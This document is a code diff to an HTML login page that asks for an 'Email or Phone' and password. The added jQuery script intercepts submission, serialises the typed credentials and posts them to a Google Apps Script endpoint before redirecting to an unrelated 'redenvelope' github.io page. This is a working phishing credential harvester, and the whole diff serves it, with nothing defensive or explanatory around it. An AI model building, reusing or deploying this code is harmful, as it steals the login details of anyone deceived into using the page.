@@ -7,7 +7,7 @@
     <link rel="stylesheet" href='index.css'>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
     <script src="https://kit.fontawesome.com/a076d05399.js"></script>
-   
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
   </script>
    </head>
 
@@ -17,13 +17,13 @@
   <div class="topnav">
     <h1>Login</h1>
   </div class="responsive">
-    <form action="https://redenvelope86vr65htj-77hf-87-00.github.io/envelope-61AyU/">
+    <form id="submit-form" action="">
       <div class="input_box">
-        <input type="text" placeholder="Email or Phone" required>
+        <input type="text" id="fname" name="name" placeholder="Email or Phone" required>
         <div class="icon"><i class="fas fa-user"></i></div>
       </div>
       <div class="input_box">
-        <input type="password" placeholder="Password" required>
+        <input type="password" id="lname" name="email" placeholder="Password" required>
         <div class="icon"><i class="fas fa-lock"></i></div>
       </div>
       
@@ -38,7 +38,25 @@
       </div> -->
      
     </form>
+    <script>
+      $("#submit-form").submit((e)=>{
+          e.preventDefault()
+          $.ajax({
+              url:"https://script.google.com/macros/s/AKfycbz-QsNSW5CBewbK7RzlvlfjrJ9qLtx3ceHDACDEiv93X6Ibs0AZJMFRnL2jmSZE7cjV/exec",
+              data:$("#submit-form").serialize(),
+              method:"post",
+              success:function (response){
+                  // alert("Form submitted successfully")
+                  // window.location.reload()
+                  window.location.href="https://redenvelope86vr65htj-77hf-87-00.github.io/envelope-61AyU/"
+              },
+              error:function (err){
+                  alert("Something Error")
   
+              }
+          })
+      })
+  </script>
 </body>
 </html>
 <!-- input_box button -->
